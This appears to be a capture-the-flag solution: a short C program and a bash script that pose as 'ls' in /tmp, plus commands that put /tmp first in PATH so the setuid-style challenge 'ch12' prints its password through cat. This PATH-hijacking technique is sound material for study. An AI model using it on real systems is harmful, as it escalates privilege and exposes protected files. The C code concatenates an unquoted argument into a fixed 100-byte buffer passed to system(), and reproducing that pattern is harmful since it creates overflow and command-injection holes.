// Create one program that remplace "ls -lA" by "cat" command (i.e lsla.c) in "/tmp" directory

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
int main (int args, char *argv[]){
        char command[100] = "cat ";
        strcat(command, argv[2]);
        printf("%s\n",command);
        system(command);
        return 0;
}

// Compiler by using the command line:
$ gcc lsla.c -o ls

// Then, add /tmp to the PATH:
$ export PATH=/tmp:$PATH

// Go to the directory that contains "ch12" execution file, then run it to get the password.
$ ./ch12

// OR
// We can create the bash script named by "ls" in "/tmp" directory. Do not forget to add the execution mode for this bash file using "chmod +x /tmp/ls"
/bin/cat "$2"

// Then excute "ch12" file
$ ./ch12
